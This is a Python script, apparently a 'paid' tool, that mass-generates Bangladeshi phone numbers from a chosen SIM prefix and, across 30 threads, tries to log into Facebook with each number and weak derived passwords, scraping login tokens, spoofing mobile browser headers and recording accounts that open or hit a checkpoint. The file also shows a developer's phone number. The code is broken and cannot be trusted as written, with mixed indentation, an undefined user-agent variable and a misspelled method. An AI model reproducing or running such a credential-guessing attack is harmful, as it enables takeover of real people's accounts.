#-----------import----------#
import os
from os import system as clr
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
#----------color----------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
taybul = random.choice([m,k,h,u,b])
oks=[]
cps=[]
loop=0
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
#----------logo-----------#
logo =(f"""   
┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
┃\033[1;33m████████╗░█████╗░██╗░░░██╗██████╗░██╗░░░██╗██╗
┃\033[1;33m╚══██╔══╝██╔══██╗╚██╗░██╔╝██╔══██╗██║░░░██║██║
┃\033[1;33m░░░██║░░░███████║░╚████╔╝░██████╦╝██║░░░██║██║
┃\x1b[1;92m░░░██║░░░██╔══██║░░╚██╔╝░░██╔══██╗██║░░░██║██║
┃\x1b[1;92m░░░██║░░░██║░░██║░░░██║░░░██████╦╝╚██████╔╝███████╗
┃\x1b[1;92m░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═════╝░░╚═════╝░╚══════╝
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\33[0;41m        [ TAYBUL PAID COMMAND ]                     \033[0;92m
\033[1;31m====================================================
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;33m DEVELOPMENT\033[1;31m:\033[1;34m TAYBUL ISLAM 
\033[1;32m│\033[1;31m➣\033[1;33m FACEBOOK   \033[1;31m:\033[1;34m MD TAYBUL ISLAM 
\033[1;32m│\033[1;31m➣\033[1;33m WHATSAPP   \033[1;31m:\033[1;34m 01747130005 
\033[1;32m│\033[1;31m➣\033[1;33m GITHUB     \033[1;31m:\033[1;34m TAYBUL1
\033[1;32m│\033[1;31m➣\033[1;33m UPDATE     \033[1;31m:\033[1;34m 1.2
\033[1;32m└────────────────────────────────────────────────┘
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO TAYBUL PAID TOOLS\33[0;m
\033[1;33m========= \33[32;33mFILE CLONE ≠ 2023 ≠ TAYBUL\33[1;33m =========""")
#----------linex def----------#
def linex():
   print(f'{taybul}---------------{B}')
#---------clear def---------#
def clear():
   clr('clear')
   print(logo)
#----------main def----------#
def MR_TAYBUL():
   clear()
   print(f'{B} [{taybul}01{B}] RANDOM CLONE ')
   print(f'{B} [{taybul}00{B}] EXIT TERMINAL ')
   linex()
   option=input(f' {B}[{taybul}??{B}] CHOICE MENU >> ')
   if option in ['01','1']:
      BD_CLONE()
   else:
   	exit(' TAYBUL :)')
#---------bd clone def----------#
def BD_CLONE():
	user=[]
	clear()
	print(' EXAMPLE SIM CODE : [017] [019] [018] [016] [013] ')
	code=input(' ENTER SIM CODE >> ')
	linex()
	print(' EXAMPLE LIMIT: [2000] [5000] [10000] ')
	try:
	  limit=int(input(' ENTER LIMIT>> '))
	except ValueError:
		limit=50000
	clear()
	for nmbr in range(limit):
		nmp= ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with tred(max_workers=30) as Taybul:
		tl=str(len(user))
		print(' TOTAL ACCOUNT: '+tl)
		print(' YOUR SIM CODE : '+code)
		print(' PROGRESS HAS BEEN STARTED ') 
		for psx in user:
			ids=code+psx
			passlist=[psx,ids]
			Taybul.submit(method_crack,ids,passlist)
	linex()
	print(' THE PROCESS HAS BEEN COMPLETE ')
	input(' PRESS ENTER TO BACK : ')
	MR_TAYBUL()
#----------method crack def----------#
def method_crack(ids,passlist):
	global oks
	global cps
	global loop
	try:
   	 for pas in passlist:
   	     session=requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            datax = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            header={'authority': 'x.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"CPH2421"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            reqx=session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=datax,headers=header).text
            req=session.cookies.get_dict().meys()
            if 'c_user' in req:
            	print('\r\r \033[1;32m[TAYBUL_OK] '+ids+' . '+pas+'\033[1;37m')
                oks.append(ids)
                break
            elif 'checkpoint' in req:
            	print('\r\r \033[1;30m[TAYBUL_CP] '+ids+' . '+pas+'\033[1;37m')
                cps.append(ids)
                break
            else:
            	continue
            loop+=1
        except:
        	pass
            	
            
   	
   	    
#----------end-----------#
MR_TAYBUL()
